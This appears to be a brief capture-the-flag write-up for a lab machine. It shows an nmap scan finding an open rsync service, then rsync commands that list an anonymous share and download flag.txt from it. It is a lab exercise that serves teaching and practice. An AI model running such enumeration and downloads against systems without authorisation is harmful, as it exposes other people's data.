## Nmap
```
PORT    STATE SERVICE REASON         VERSION
873/tcp open  rsync   syn-ack ttl 63 (protocol version 31)
```
## Step
```bash
rsync --list-only {target ip}::
	public         	Anonymous Share
rsync --list-only {target ip}::public
	drwxr-xr-x          4.096 2022/10/25 05:02:23 .
	-rw-r--r--             33 2022/10/25 04:32:03 flag.txt
rsync {target ip}::public/flag.txt flag.txt
cat flag.txt // ===> the flag
```